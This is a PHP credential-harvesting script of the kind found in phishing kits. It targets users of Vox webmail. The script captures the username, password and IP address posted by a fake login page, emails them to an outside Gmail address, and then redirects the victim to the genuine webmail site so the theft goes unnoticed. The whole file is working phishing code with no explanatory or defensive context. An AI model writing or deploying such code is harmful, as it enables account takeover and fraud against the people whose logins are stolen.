<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Vox Page----------------------\n";
$message .= "?????: ".$_POST['_user']."\n";
$message .= "? ?: ".$_POST['_pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Cla---------------------\n";
$recipient = "clarksteven844@gmail.com";
$subject = "Vox mail";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Texlon-Version: 1.0\n";
	 mail("", "Texlon$", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://webmail.vox.co.za/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>

